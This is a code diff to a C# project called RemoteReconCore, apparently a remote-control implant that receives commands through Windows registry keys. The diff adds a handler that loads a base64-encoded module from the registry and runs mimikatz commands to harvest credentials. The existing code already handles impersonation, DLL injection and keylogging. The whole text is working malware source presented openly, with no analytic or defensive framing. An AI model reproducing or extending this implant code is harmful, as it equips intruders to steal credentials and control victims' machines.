@@ -46,6 +46,17 @@ namespace RemoteReconCore
                 //Post results to the appropriate key
                 switch (command.Key)
                 {
+                    case (int)Cmd.mimikatz:
+#if DEBUG
+                        Console.WriteLine("Writing mimikatz command result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, string>(0, "");
+                        break;
                     case (int)Cmd.Impersonate:
 #if DEBUG
                         Console.WriteLine("Writing Impersonate command Result");
@@ -105,7 +116,7 @@ namespace RemoteReconCore
                         result = new KeyValuePair<int, string>(0, "");
                         break;
                     case (int)Cmd.InjectDll:
-#if DEBUG 
+#if DEBUG
                         Console.WriteLine("Writing DllInject command result");
 #endif
                         rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
@@ -116,7 +127,7 @@ namespace RemoteReconCore
                         result = new KeyValuePair<int, string>(0, "");
                         break;
                     case (int)Cmd.KeylogStop:
-#if DEBUG 
+#if DEBUG
                         Console.WriteLine("Writing Keylog stop command result");
 #endif
                         rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
@@ -237,6 +248,17 @@ namespace RemoteReconCore
                 string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Sleep is set to " + interval));
                 result = new KeyValuePair<int, string>(0, msg);
             }
+            else if ((int)Cmd.mimikatz == command.Key)
+            {
+                //run a mimikatz command
+#if DEBUG
+                Console.WriteLine("Received mimikatz command");
+#endif
+                mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
+                string decoded = Encoding.ASCII.GetString(Convert.FromBase64String((string)command.Value));
+                mimikatz mk = new mimikatz(decoded, mod);
+                result = mk.Run();
+            }
         }
 
         //Some static class variables 
@@ -262,7 +284,8 @@ namespace RemoteReconCore
             RevertFailed = 5,
             InjectDllFailed = 6,
             KeylogStopFailed = 7,
-            SleepFailed = 8
+            SleepFailed = 8,
+            mimikatzFailed = 9
         }
 
         //Command enum 
@@ -276,7 +299,8 @@ namespace RemoteReconCore
             Revert = 5,
             InjectDll = 6,
             KeylogStop = 7,
-            Sleep = 8
+            Sleep = 8,
+            mimikatz = 9
         }
         
         //Helper function to patch the Native module with the appropriate command
